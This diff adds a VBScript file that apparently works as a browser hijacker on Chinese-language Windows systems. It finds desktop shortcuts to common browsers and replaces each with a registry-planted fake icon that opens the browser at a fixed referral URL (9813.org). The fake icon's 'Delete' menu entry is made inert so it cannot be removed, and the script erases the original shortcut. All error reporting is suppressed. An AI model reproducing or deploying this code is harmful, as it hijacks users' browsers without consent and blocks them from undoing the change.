@@ -1,0 +1,56 @@
+On Error Resume Next 
+strFolderPath="C:\Documents and Settings\All Users\桌面" 
+Set OperationRegistry=WScript.CreateObject("WScript.Shell")
+Dim m
+m=OperationRegistry.RegRead("HKEY_CLASSES_ROOT\http\shell\open\command\")
+n = Split(m, """")
+h = n(1)
+x=""""
+y=""""
+a= x+h+y
+strToReplace= a 
+strReplace= a 
+Set wshShell = CreateObject("Shell.Application") 
+Set wshFSO = CreateObject("Scripting.FileSystemObject") 
+AlterSubFolders wshFSO.GetFolder(strFolderPath) 
+Sub AlterSubFolders(Folder) 
+Set npFolder = wshShell.Namespace (Folder.Path) 
+Set allFiles=Folder.Files 
+For Each lnkFile In allFiles 
+If InStrRev(UCase(lnkFile.Name), ".LNK") <> 0 Then 
+Set lnkItem = npFolder.ParseName(lnkFile.Name) 
+Set lnkItemLink = lnkItem.GetLink
+b = """"&lnkItemLink.Path&""""
+'Wscript.Echo lnkFile.Name
+If InStr(1, LCase(b), LCase("Safari.exe"), 1) > 0 Or InStr(1, LCase(b), LCase("Maxthon.exe"), 1) > 0 Or InStr(1, LCase(b), LCase("SogouExplorer.exe"), 1) > 0 Or InStr(1, LCase(b), LCase("TheWorld.exe"), 1) > 0 Or InStr(1, LCase(b), LCase("TTraveler.exe"), 1) > 0 Or InStr(1, LCase(b), LCase("360SE.exe"), 1) > 0 Or InStr(1, LCase(b), LCase("chrome.exe"), 1) > 0 Or InStr(1, LCase(b), LCase("GreenBrowser.exe"), 1) > 0 Or InStr(1, LCase(b), LCase("opera.exe"), 1) > 0 Or InStr(1, LCase(b), LCase("firefox"), 1) Then
+bcd = ""&lnkItemLink.Path&""
+def = lnkFile.Name
+hig = Split(def, ".lnk")
+klm = hig(0)
+eee = strFolderPath+"\"+lnkFile.Name
+Dim OperationRegistry
+Set OperationRegistry=WScript.CreateObject("WScript.Shell")
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\",""
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\",""
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\",klm
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\DefaultIcon\",bcd
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\Shell\",""
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\Shell\Open(&O)\","打开主页(&H)"
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\Shell\Open(&O)\Command\",bcd+" %1 http://www.9813.org/?tn=803"
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\Shell\Z\","删除(&D)"
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\Shell\Z\Command\","Rundll32.exe"
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\Shell\属性(&R)\",""
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\Shell\属性(&R)\Command\","Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\ShellFolder\",""
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{C42EB5A1-0EED-E549-91B0-153485753982}\ShellFolder\Attributes",10,"REG_DWORD"
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\",""
+OperationRegistry.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{C42EB5A1-0EED-E549-91B0-153485753982}\",""
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+objFSO.DeleteFile  eee
+'objFSO.MoveFile rr, "C:\Documents and Settings\All Users\桌面\"
+    else
+    End If
+End If 
+Next 
+End Sub
+
